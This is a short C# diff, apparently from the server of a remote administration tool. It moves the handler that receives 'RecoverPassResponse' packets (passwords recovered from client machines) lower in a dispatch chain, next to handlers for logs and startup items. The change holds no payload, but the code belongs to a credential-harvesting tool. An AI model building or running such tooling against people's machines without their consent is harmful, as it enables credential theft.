@@ -251,10 +251,6 @@ namespace xServer.Forms
             {
                 CommandHandler.HandleStatus(client, (Core.Packets.ClientPackets.Status) packet);
             }
-            else if (type == typeof(Core.Packets.ClientPackets.RecoverPassResponse))
-            {
-                CommandHandler.HandlePasswordResponse(client, (Core.Packets.ClientPackets.RecoverPassResponse)packet);
-            }
             else if (type == typeof(Core.Packets.ClientPackets.UserStatus))
             {
                 CommandHandler.HandleUserStatus(client, (Core.Packets.ClientPackets.UserStatus)packet);
@@ -299,6 +295,10 @@ namespace xServer.Forms
             {
                 CommandHandler.HandleGetStartupItemsResponse(client,
                     (Core.Packets.ClientPackets.GetStartupItemsResponse)packet);
+            }
+            else if (type == typeof(Core.Packets.ClientPackets.RecoverPassResponse))
+            {
+                CommandHandler.HandlePasswordResponse(client, (Core.Packets.ClientPackets.RecoverPassResponse)packet);
             }
             else if (type == typeof(Core.Packets.ClientPackets.GetLogsResponse))
             {
